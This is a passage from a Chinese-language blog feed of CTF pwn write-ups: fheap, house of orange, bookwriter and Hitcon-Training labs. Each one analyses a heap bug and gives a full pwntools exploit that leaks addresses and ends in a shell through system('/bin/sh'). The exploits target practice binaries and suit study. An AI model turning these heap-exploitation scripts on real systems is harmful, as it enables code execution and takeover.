u64(p.recvuntil('\x0a')[:-1].ljust(8,'\x00'))print "heap --&gt; " + hex(heap)#---------------------------------------------------# gdb.attach(p,"b *0x4008F4")gets(0,0x68,'n0va_2')gets(1,0x68,'n0va_3')gets(2,0,'aaaa')gets(3,0,'/bin/sh') # heap的位置 # double free 将fack_chunk链到 0号后面,即 0-&gt;fd = fadc_chunkfree(0)free(1)free(0)gets(0,0x68,p64(fack_chunk))gets(1,0x68,'n0va')gets(0,0x68,p64(fack_chunk))payload = 'a'*0x13 + p64(0x400856)# gdb.attach(p,"b *0x4008F4")gets(3,0x68,payload)# heap + 0x10 '/bin/sh'的位置 gets(4,heap+0x10,'yes?')p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hctf2016-fheap]]></title>
    <url>%2F2020%2F06%2F21%2Fhow2heap%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[题目介绍程序只有两个功能： 121.create string2.delete string 1、create 功能 先申请一个0x20大小的堆空间，接着输入字符串，如果字符长度&lt;0xf那么直接放入ptr里，如果 &gt;0xf 则再申请适合长度的堆空间存字符，然后将指针存到ptr中，最后会将堆的free函数存储在堆存储结构的后8字节处，如下图 2、delete 函数调用存储在结构体里的free_func指针来释放堆 由于free时没有将指针置空，出现了释放后仍可利用的现象，即uaf 利用思路查看保护机制 可以看到保护全开，所以在解题过程中要先绕过PIE。 思路：首先利用uaf，利用堆块之间申请与释放的步骤，形成对free_func指针的覆盖。从而达到劫持程序流的目的。具体来说，先申请三个字符长度小于0xf 的堆块，并将其释放。此时fastbin中空堆块的单链表结构如下图： 那么此时再创建一个字符长度为0x20的字符串，则申请出来的堆结构会是如下图 此时就可以将1号堆块的free_func指针覆盖为任意内容，指向我们需要执行的函数，随后再调用1号块的free_func函数，实现劫持函数流的目的。 利用过程1、绕过PIE在能劫持函数流之后 ，首先是泄露出程序的地址以绕过PIE，具体方法是：将free_func的低位覆盖为0x2d，去执行puts函数，打印出free_func的地址从而得到程度基地址。 2、泄露真实地址得到基地址后，下一步要做的就是泄露真实地址了，puts函数执行完后程序回到了0xc71处，此时fastbin中只有2号堆块，所以要先释放0号堆块，释放完后3个堆块都处理空闲状态了，此时查看栈中的情况会发现，在delete中输入的yes其实是存储在栈中的，而且，可读入0x100个字节。 这样，我们就可以在栈上布局rop链达到劫持程序流的目的， 我们可以找到pop_pop_pop_pop这样的gadget将栈顶的4个元素弹出，’yes’之后便是返回地址。再调用puts函数打印出puts_got得到puts的真实地址。再利用同样的方式调用system(‘/bin/sh’) EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#coding:utf-8from pwn import *from ctypes import *context.log_level = 'debug'p = process('./pwn-f')elf = ELF('./pwn-f')libc = elf.libc#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) def create(size, string,isdebug): p.recvuntil('3.quit\n') p.sendline('create ') p.recvuntil('Pls give string size:') p.sendline(str(size)) p.recvuntil('str:') if isdebug: debug(0xf76,1) p.send(string + '\x00')def delete(id,isdebug): p.recvuntil('3.quit\n') p.sendline('delete ') p.recvuntil('id:') p.sendline(str(id)) p.recvuntil('Are you sure?:') if isdebug: debug(0xe37,1) p.sendline('yes')def quit(): p.recvuntil('3.quit\n') p.sendline('quit ')create(15,'aaa\n',0)create(15,'bbb\n',0)create(15,'ccc\n',0)delete(2,0)delete(1,0)delete(0,0)# debug(0xee2)create(0x20,'a'*24+'\x2d',0)# debug(0xd95,1)delete(1,1)p.recvuntil('a'*24)elf_base = u64(p.recv(6).ljust(8,'\x00')) - 0xd2dprintf_plt = elf_base + 0x9d0puts_plt = elf_base + 0x990puts_got = elf_base + 0x202030print "elf_base --&gt; " + hex(elf_base)print "printf_plt --&gt; " + hex(printf_plt)print "puts_plt --&gt; " + hex(puts_plt)pause()pop_4 = 0x11dc + elf_basepop_rdi = 0x11e3 + elf_baseprint "pop_4 --&gt; " + hex(pop_4)# pause()delete(0,0)payload = 0x18*'a'payload += p64(pop_4)create(0x20,payload,0)p.recvuntil('3.quit\n')p.sendline('delete ')p.recvuntil('id:')p.sendline('1')p.recvuntil('Are you sure?:')temp = 'yesaaaaa'temp += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)temp += p64(0xc71 + elf_base)p.sendline(temp)puts_addr = u64(p.recv(6).ljust(8,'\x00'))print "puts_addr --&gt; " + hex(puts_addr)offset = puts_addr - libc.symbols['puts']onegadget = offset + 0x45216# print "onegadget --&gt; " + hex(onegadget)system_addr = offset + libc.symbols['system']binsh_addr = offset + libc.search('/bin/sh').next()print "system_addr --&gt; " + hex(system_addr)print "binsh_addr --&gt; " + hex(binsh_addr)pause()delete(0,0)payload = 0x18*'a'payload += p64(pop_4)create(0x20,payload,0)p.recvuntil('3.quit\n')p.sendline('delete ')p.recvuntil('id:')p.sendline('1')p.recvuntil('Are you sure?:')temp = 'yesaaaaa'temp += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)p.sendline(temp)p.interactive()]]></content>
      <categories>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[house of orange 学习]]></title>
    <url>%2F2020%2F06%2F21%2Fhouse%20of%20orange%2F</url>
    <content type="text"><![CDATA[大名鼎鼎 house of orange来自于Hitcon CTF 2016中的一道 同名题目，其可以在没有free的情况下得到一块unsorted bin，因为unsorted bin的fd,bk为main_arean+88，所以可以通过申请切割unsorted bin来泄漏libc地址（没有深入了解的我一直以为这是house of orange仅此而已的用处……汗……） House_of_orange – 2016Hitcon CTF题目逻辑很简单，一共可以build 4次，每次build分进行3次堆分配，两次malloc，一次calloc，其中一次malloc是固定的0x10字节作为控制堆块，放着name和color的信息，另外按输入分配name 的大小。 程序漏洞堆溢出：在upgrede 中没有规范size大小导致堆溢出12345678910111213141516171819202122232425262728293031323334int __fastcall upgrade(__int64 a1, __int64 a2)&#123; _DWORD *v3; // rbx unsigned int size; // [rsp+8h] [rbp-18h] signed int v5; // [rsp+Ch] [rbp-14h] if ( unk_203074 &gt; 2u ) return puts("You can't upgrade more"); if ( !qword_203068 ) return puts("No such house !"); printf("Length of name :", a2); size = sub_C65(); if ( size &gt; 0x1000 ) size = 4096; printf("Name:"); sub_C20((void *)qword_203068[1], size); // size没有限制，堆溢出 printf("Price of Orange: ", size); v3 = (_DWORD *)*qword_203068; *v3 = sub_C65(); sub_CC4(); printf("Color of Orange: "); v5 = sub_C65(); if ( v5 != 56746 &amp;&amp; (v5 &lt;= 0 || v5 &gt; 7) ) &#123; puts("No such color"); exit(1); &#125; if ( v5 == 56746 ) *(_DWORD *)(*qword_203068 + 4LL) = 56746; else *(_DWORD *)(*qword_203068 + 4LL) = v5 + 30; ++unk_203074; return puts("Finish");&#125; 漏洞利用1、漏洞libc地址因为程序存在堆溢出，所以可以修改top_chunk的大小，在malloc源码里面对于申请的堆块大小超过了top_chunk大小，将调用sysmalloc来进行分配，sysmalloc针对这种情况有两种处理，一种是直接mmap出来一块内存，一种是扩展top_chunk1234567891011/* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */if ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold) &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)) &#123; char *mm; /* return value from mmap call*/ try_mmap: 也就是如果申请的大小&gt;=mp_.mmap_threshold,就会mmap，所以只要我们申请的不要太大，就可以避免触发这个，mmap_threshold的值为128*1024，不过下面有两个assert需要检查 ：123456789101112131415161718old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size)); brk = snd_brk = (char *) (MORECORE_FAILURE); /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; pagemask) == 0)); /* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE)); 第一个asser就是要求修改后的top_chunk_size必须满足：1234561、top_chunk_size&gt;MINSIZE(MINISIZE)(并不知道具体值是多少，反正不要太小就行了)2、top_chunk需要有pre_inuse的标志，也就是最后一个比特为13、old_end &amp; pagemask == 0 #define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s))) 伪造的size必须页对齐，也就是(top_chunk+size-1) &amp; 0xfff == 04、top_chunk_size小于申请分配的内存 满足以上四个条件之后，继续往下执行最后会把原先的old_top给释放掉了12345678910111213141516top (av) = chunk_at_offset (heap, sizeof (*heap));set_head (top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE); /* Setup fencepost and free the old top chunk with a multiple of MALLOC_ALIGNMENT in size. *//* The fencepost takes at least MINSIZE bytes, because it might become the top chunk again later. Note that a footer is set up, too, although the chunk is marked in use. */old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);if (old_size &gt;= MINSIZE) &#123; set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE); set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ)); set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA); _int_free (av, old_top, 1); 这样，free出来就能得到一个unsorted bin，然后再次分配就可以从unsorted bin中切割出来。接下来就可以堆溢出构造unsorted bin attack了，再伪造vtable进行FSOP攻击首先来看一下漏洞的触发而_IO_flush_all_lockp不需要攻击者手动调用，在一些情况下这个函数会被系统调用：1、当libc执行abort流程时2、当执行exit函数时3、当执行流从main 函数返回时FSOP也就 File Stream Oriented Programming，也是一种支持程序流程的方法，只不过方式是通过攻击File Stream来实现先了解malloc对错误信息的处理过程，调用malloc_printerr,而malloc_printerr中用来打印错误的函数是__libc_message，之后又调用了abort函数，而abort函数中调用了_IO_flush_all_lockp，这里面用到了IO_FILE_ALL的结构，采用上虚表的方式调用，所以如果我们能修改IO_FILE的内容那么就可以一定程度上支持流程；那么怎么支持呢，这里又需要用到unsorted bin attack的知识：在malloc的过程中，unsorted bin会从链表上卸下来，就是会把bk+0x10的位置写入本unsorted bin的地址，也就是amin_arena的地址我们通过硬件断点来观察一下：可以看到，断点被触发后_IO_list_all被修改成了指向top_chunk的地址main_arena+88但是问题又来了，我们无法控制 main_arena的内容，那么该怎么处理呢？这里还牵到io_file的使用了，IO_FILE结构中有一个字段是chain字段 ，它位于0x60偏移处，它指向的是下一个IO_FILE结构体，如果能够控制 这个字段，就能再指定IO_FILE的位置，它相当于是一个链表的结构；如此，，又联系到了small_chunk的问题了，在拆卸unsorted_bin的时候对属于small_bin的chunk进行了记录操作而IO_FILE_ALL指向的偏移0x60的位置正好是small_bin的index为5的地方，所以upgrede的时候需要把unsortbin设置为0x60大小。因为第一个分配在main_arena的IO_FILE_plus结构 的fp-&gt;mode等值不符合要求，所以会通过chains跳转到下一个IO_FILE_plus，也就是我们之前设的unsorted bin，然后这个伪造的IO_FILE_plus需要满足以下条件1231、fp-&gt;mode &gt; 02、_IO_vtable_offset(fp) == 03、fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base 整个程序支持流程如下： malloc --&gt; _int_malloc --&gt; __libc_message --&gt; abort --&gt; _IO_flush_all_lockp --&gt; _IO_overflow exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#coding:utf-8from pwn import *local = 1if local: context.log_level = 'debug' p = process('./houseoforange') elf = ELF('./houseoforange') libc = elf.libcelse: p = remote("") # elf = ELF('./houseoforange')#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def pack_file(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _wide_data = 0, _mode = 0): file_struct = p32(_flags) + \ p32(0) + \ p64(_IO_read_ptr) + \ p64(_IO_read_end) + \ p64(_IO_read_base) + \ p64(_IO_write_base) + \ p64(_IO_write_ptr) + \ p64(_IO_write_end) + \ p64(_IO_buf_base) + \ p64(_IO_buf_end) + \ p64(_IO_save_base) + \ p64(_IO_backup_base) + \ p64(_IO_save_end) + \ p64(_IO_marker) + \ p64(_IO_chain) + \ p32(_fileno) file_struct = file_struct.ljust(0x88, "\x00") file_struct += p64(_lock) file_struct = file_struct.ljust(0xa0, "\x00") file_struct += p64(_wide_data) file_struct = file_struct.ljust(0xc0, '\x00') file_struct += p64(_mode) file_struct = file_struct.ljust(0xd8, "\x00") return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr): payload = pack_file(_flags = 0, _IO_read_ptr = 0x61, #smallbin4file_size _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr, _IO_write_base = 0, _IO_write_ptr = 1, _IO_buf_base = binsh_addr, _mode = 0, ) payload += p64(_IO_str_jumps_addr-8) # vtable payload += p64(0) # paddding payload += p64(system_addr) return payloaddef get_io_str_jumps_offset(libc): IO_file_jumps_offset = libc.sym['_IO_file_jumps'] IO_str_underflow_offset = libc.sym['_IO_str_underflow'] for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: # print possible_IO_str_jumps_offset return possible_IO_str_jumps_offsetdef house_of_orange_payload(libc, libc_base): io_str_jump = libc_base + get_io_str_jumps_offset(libc) io_list_all = libc_base + libc.symbols['_IO_list_all'] system = libc_base + libc.symbols['system'] bin_sh = libc_base + next(libc.search('/bin/sh')) payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh) return payloaddef build(size,name,price,color): sla("choice : ",'1') sla("name :",str(size)) sda("Name :",name) sla("Orange:",str(price)) sla("Orange:",str(color))def see(): sla("choice : ",'2')def upgrade(size,name,price,color): sla("choice : ",'3') sla("name :",str(size)) sla("Name:",name) sla("Orange: ",str(price)) sla("Orange: ",str(color))build(0x28,'R4bb1t',1,1)pay = 0x28*'\x00' + p64(0x21) + 0x18*'\x00' + p64(0xf91)upgrade(0x100,pay,1,1)build(0xf90,'n0va',2,2)build(8,'a',3,3)see()ru("house : ")main_arena = u64(rc(6).ljust(8,'\x00'))-65malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']log.warn("libc_base --&gt; %s",hex(libc_base))pay = house_of_orange_payload(libc,libc_base)# debug(0x1119)upgrade(0x1000,0x30*'\x00' + pay,4,4)# debug(0xd68)sla("choice : ",'1')# debug()p.interactive() bookwriter – pwnable.tw一样是用到house_of_orange 程序同样没有free功能123456789---------------------- BookWriter ---------------------- 1. Add a page 2. View a page 3. Edit a page 4. Information 5. Exit ---------------------- Information功能可以泄漏堆地址，可用也可不用，因为’/bin/sh\x00’也可以直接用libc地址 漏洞点0x01首先，自己实现的read函数没有0截断1234567891011121314__int64 __fastcall my_read(__int64 a1, unsigned int a2)&#123; unsigned int v3; // [rsp+1Ch] [rbp-4h] v3 = _read_chk(0LL, a1, a2, a2); if ( (v3 &amp; 0x80000000) != 0 ) &#123; puts("read error"); exit(1); &#125; if ( *(_BYTE *)((signed int)v3 - 1LL + a1) == 10 )// 如果不输入回车就没有0截断 *(_BYTE *)((signed int)v3 - 1LL + a1) = 0; return v3;&#125; 0x02edit函数中每次都会更新size，通过strlen，结合my_read没有0截断的情况，这里存在溢出可以修改到下一个chunk的size123456789101112131415161718int edit()&#123; unsigned int v1; // [rsp+Ch] [rbp-4h] printf("Index of page :"); v1 = sub_4008CD(); if ( v1 &gt; 7 ) &#123; puts("out of page:"); exit(0); &#125; if ( !qword_6020A0[v1] ) return puts("Not found !"); printf("Content:"); my_read((__int64)qword_6020A0[v1], qword_6020E0[v1]);// 这里没有0截断 qword_6020E0[v1] = strlen(qword_6020A0[v1]); // 结合上面的没有0截断，这里存在溢出 return puts("Done !");&#125; 0x03add函数中，两个全局变量，0x6020A0存在堆指针，相邻的0x6020E0存在size，且0x6020a0-&gt;0x6020e0 is 0x40 bytes (0x8 words)也就是可以存放8个堆指针，但是add函数中到堆块的约束条件是i&gt;8 &amp;&amp; !qword_6020A0[i]，也就是可以申请第9个，只要这个时候qword_6020A0[8] == 0也就是0x6020E0 == 0，这样，0号堆块的size位就被放上了一个堆地址，这样就造成了堆溢出 漏洞利用1、通过edit中的溢出修改top_chunk的size，house_of_orange得到一块main_arena进行泄漏地址2、利用0号块的size溢出构造FSOP攻击exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155from pwn import *local = 1if local: context.log_level = 'debug' p = process('./bookwriter') elf = ELF('./bookwriter') libc = elf.libcelse: p = remote("chall.pwnable.tw","10304") elf = ELF('./bookwriter') libc = ELF('./libc_64.so.6')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def pack_file(_flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0, _IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0, _IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _IO_marker = 0, _IO_chain = 0, _fileno = 0, _lock = 0, _wide_data = 0, _mode = 0): file_struct = p32(_flags) + \ p32(0) + \ p64(_IO_read_ptr) + \ p64(_IO_read_end) + \ p64(_IO_read_base) + \ p64(_IO_write_base) + \ p64(_IO_write_ptr) + \ p64(_IO_write_end) + \ p64(_IO_buf_base) + \ p64(_IO_buf_end) + \ p64(_IO_save_base) + \ p64(_IO_backup_base) + \ p64(_IO_save_end) + \ p64(_IO_marker) + \ p64(_IO_chain) + \ p32(_fileno) file_struct = file_struct.ljust(0x88, "\x00") file_struct += p64(_lock) file_struct = file_struct.ljust(0xa0, "\x00") file_struct += p64(_wide_data) file_struct = file_struct.ljust(0xc0, '\x00') file_struct += p64(_mode) file_struct = file_struct.ljust(0xd8, "\x00") return file_structdef pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, system_addr, binsh_addr): payload = pack_file(_flags = 0, _IO_read_ptr = 0x61, #smallbin4file_size _IO_read_base = _IO_list_all_ptr-0x10, # unsorted bin attack _IO_list_all_ptr, _IO_write_base = 0, _IO_write_ptr = 1, _IO_buf_base = binsh_addr, _mode = 0, ) payload += p64(_IO_str_jumps_addr-8) # vtable payload += p64(0) # paddding payload += p64(system_addr) return payloaddef get_io_str_jumps_offset(libc): IO_file_jumps_offset = libc.sym['_IO_file_jumps'] IO_str_underflow_offset = libc.sym['_IO_str_underflow'] for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: # print possible_IO_str_jumps_offset return possible_IO_str_jumps_offsetdef house_of_orange_payload(libc, libc_base): io_str_jump = libc_base + get_io_str_jumps_offset(libc) io_list_all = libc_base + libc.symbols['_IO_list_all'] system = libc_base + libc.symbols['system'] bin_sh = libc_base + next(libc.search('/bin/sh')) payload = pack_file_flush_str_jumps(io_str_jump, io_list_all, system, bin_sh) return payloaddef author(name): sla("Author :",name)def add(size,message=''): sla("choice :",'1') sla("page :",str(size)) if size: sda("Content :",message)def show(idx): sla("choice :",'2') sla("page :",str(idx))def edit(idx,message): sla("choice :",'3') sla("page :",str(idx)) sla("Content:",message)def link_heap(): sla("choice :",'4') ru(0x40*'a') res = u64(ru('\n').strip('\n').ljust(8,'\x00')) sla(") ",str(0)) return resauthor(0x40*'a')add(0x18,0x18*'a')edit(0,0x18*'a')edit(0,0x18*'a' + '\xe1\x0f\x00')heap_addr = link_heap()-0x10log.warn("heap_addr --&gt; %s",hex(heap_addr))edit(0,'\x00')for i in range(8): add(0x18,'b')show(7)ru("Content :\n")main_arena = u64(ru('\n').strip('\n').ljust(8,'\x00'))-66malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']system = libc_base + libc.symbols['system']IO_list_all = libc_base + libc.symbols['_IO_list_all']log.warn("libc_base --&gt; %s",hex(libc_base))pay = house_of_orange_payload(libc,libc_base)'''pay = 0x110*'\x00'pay += '/bin/sh\x00'pay += p64(0x61) + p64(main_arena+88)pay += p64(IO_list_all-0x10)pay += p64(2) + p64(3)pay += p64(0)*9pay += p64(system)pay += p64(0)*11pay += p64(heap_addr+0x180)'''# gdb.attach(p,"b *0x4009FE")edit(0,0x110*'\x00' + pay)add(0)# gdb.attach(p)p.interactive() house_of_orange攻击有一定概率失败，主要原因是在Bypass时，12if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 由于第一次将_IO_list_all支持到main_arena时，main_arena不可控，该内存随机，所以有时(fp-&gt;_mode&lt;=0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base)结果 为0，造成执行_IO_overflow(fp,EOF) == EOF调用未知vtable错误地址，程序 abort，所以程序有一定的失败率 参考资料：https://bbs.pediy.com/thread-222718.htmhttps://tac1t0rnx.space/2018/01/10/house-of-orange/https://wiki.x10sec.org/pwn/heap/house_of_orange/http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon-Training lab10~lab15]]></title>
    <url>%2F2020%2F06%2F21%2FHitcon-Training(%E4%B8%8B)%2F</url>
    <content type="text"><![CDATA[lab10这一题开始就是堆的范畴了 题目介绍程序只开启了NX保护 有三个功能，分别是add，delete跟print 123456---------------------- 1. Add note 2. Delete note 3. Print note 4. Exit ---------------------- 先一看一下add: 主要过程就是先申请一个8的堆用来存储print函数和数据的地址（也是堆地址），数据另外存储在新申请的malloc(size)堆中， 然后这个8大小的指针会存到bss去(notelist)，也就是如下图 接下来看delete函数： 通过indext free 掉add过程中申请的两个堆空间，但是free后并没有将指针清空，而且指针扔留在bss中，所以就存在了Use-After_Free printf函数： 通过indext找到对应的printf 函数调用 程序中还存在cat flag函数，所以我们只需要想方法调用这个函数就行了 利用过程通过分析程序的功能我们发现存在uaf漏洞，具体但用过程： 1、先申请3个chunk块，大小为16（fast bin 范围内即可） 2、free 掉chunk1、chunk2 此时fast bin 中的分布是这样的： 123fastbins0x10: 0x97c5028 —▸ 0x97c5000 ◂— 0x00x18: 0x97c5038 —▸ 0x97c5010 ◂— 0x0 notelist 中是这样的： 12345pwndbg&gt; telescope 0x0804A07000:0000│ 0x804a070 (notelist) —▸ 0x97c5008 ◂— 0x001:0004│ 0x804a074 (notelist+4) —▸ 0x97c5030 —▸ 0x97c5000 ◂— 0x002:0008│ 0x804a078 (notelist+8) —▸ 0x97c5058 —▸ 0x804865b (print_note_content) ◂— push ebp03:000c│ 0x804a07c (notelist+12) ◂— 0x0 此时我们再申请一个大小为8的chunk，内容为magic函数地址，这样，0x97c5000就会指向magic函数 123456pwndbg&gt; telescope 0x0804A07000:0000│ 0x804a070 (notelist) —▸ 0x97c5008 —▸ 0x8048986 (magic) ◂— push ebp01:0004│ 0x804a074 (notelist+4) —▸ 0x97c5030 —▸ 0x804865b (print_note_content) ◂— push ebp02:0008│ 0x804a078 (notelist+8) —▸ 0x97c5058 —▸ 0x804865b (print_note_content) ◂— push ebp03:000c│ 0x804a07c (notelist+12) —▸ 0x97c5030 —▸ 0x804865b (print_note_content) ◂— push ebp04:0010│ 0x804a080 (notelist+16) ◂— 0x0 printf chunk1即可执行magic函数 exp: 123456789101112131415161718192021222324252627282930313233from pwn import *p = process('./hacknote')context.log_level = 'debug'catflag = 0x8048986def Add(size,string): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Note size :') p.sendline(str(size)) p.recvuntil('Content :') p.sendline(string)def Delete(i): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(i))def Print(i): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(i))Add(16,'n0va_1')# gdb.attach(p,"b *0x8048A8C")Add(16,'n0va_2')Add(16,'n0va_3')# gdb.attach(p,"b *0x8048A8C")Delete(0)Delete(1)Add(8,p32(catflag))Print(0)p.interactive() lab 11首先程序的功能很简单，增、删、查、改 在change功能中没有对len进行检测，存在任意长度的堆溢出 同时函数有可以直接读flag的后门函数 程序在开始的时候申请了一个大小为0x20的堆块用来存放hello_message跟goodbye_message函数指针，开始时调用hello，结束时调用goodbye 最简单的做法就是house of force 申请到存放goodbye指针的堆块，修改goodbye为magic exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *context.log_level = 'debug'local = 1if local: p = process('./bamboobox') elf = ELF('./bamboobox') libc = elf.libcelse: p = remote("")sl = lambda s:p.sendline(s)sd = lambda s:p.send(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(len,name): ru('choice:') sl('2') ru('name:') sl(str(len)) ru('item:') sl(name)def change(index,len,name): ru('choice:') sl('3') ru('item:') sl(str(index)) ru('name:') sl(str(len)) ru('item:') sd(name)def remove(index): ru('choice:') sl('4') ru('item:') sl(str(index))def show(): ru('choice:') sl('1')itemlist = 0x6020C0magic = 0x400D49add(0x400,'b')add(0x10,'a')#0pay = p64(0)*3 + p64(0xffffffffffffffff)change(1,0x100,pay)# gdb.attach(p,"b *0x400A6F")add(-0x460,'a')pay = p64(magic)*2add(0x100,pay)ru('choice:')sl('5')# gdb.attach(p)p.interactive() 做为练习，感觉用后门太*了，所以也可以通过unlink修改got表getshell exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'local = 1if local: p = process('./bamboobox') elf = ELF('./bamboobox') libc = elf.libcelse: p = remote("")sl = lambda s:p.sendline(s)sd = lambda s:p.send(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(len,name): ru('choice:') sl('2') ru('name:') sl(str(len)) ru('item:') sl(name)def change(index,len,name): ru('choice:') sl('3') ru('item:') sl(str(index)) ru('name:') sl(str(len)) ru('item:') sd(name)def remove(index): ru('choice:') sl('4') ru('item:') sl(str(index))def show(): ru('choice:') sl('1')itemlist = 0x6020C0add(0x20,'a')#0add(0x90,'b')#1add(0x90,'c')#2# add(0x20,'d')#3fack_chunk = 0x6020c8fd = fack_chunk - 0x18bk = fack_chunk - 0x10pay = p64(0) + p64(0x21) + p64(fd) + p64(bk) + p64(0x20) + p64(0xa0)change(0,0x30,pay)remove(1)pay = p64(0)*2pay += p64(0x100) + p64(itemlist)#0pay += p64(0x100) + p64(elf.got['free'])#1pay += p64(0x100) + p64(elf.got['malloc'])#2pay += p64(0x100) + p64(elf.got['atoi'])#3change(0,0x100,pay)change(1,0x10,p64(elf.plt['puts'])[:-1])remove(2)malloc_addr = u64(rc(6).ljust(8,'\x00'))libc_base = malloc_addr - libc.symbols['malloc']system = libc_base + libc.symbols['system']log.info("malloc_addr --&gt; %s",hex(malloc_addr))log.info("libc_base --&gt; %s",hex(libc_base))log.info("system --&gt; %s",hex(system))pay = p64(0x100) + p64(elf.got['free'])pay += p64(0x100) + p64(elf.got['malloc'])change(0,0x100,pay)change(0,0x100,p64(system)[:-1])change(1,0x100,'/bin/sh')remove(1)# gdb.attach(p)p.interactive() lab12程序功能： 跟常规堆题一样有一个flowlist的全局数组来存放堆块，在del函数中只是将标记置为0，并没有将指针置空，所以存在uaf 利用思路： 泄漏出libc地址 —&gt; double free attack 修改malloc_hook为onegadget，调用malloc getshell exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#coding:utf-8from pwn import *context.log_level = 'debug'local = 1if local: p = process('./secretgarden') elf = ELF('./secretgarden') libc = elf.libcelse: p = remote("") # elf = ELF('./')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + 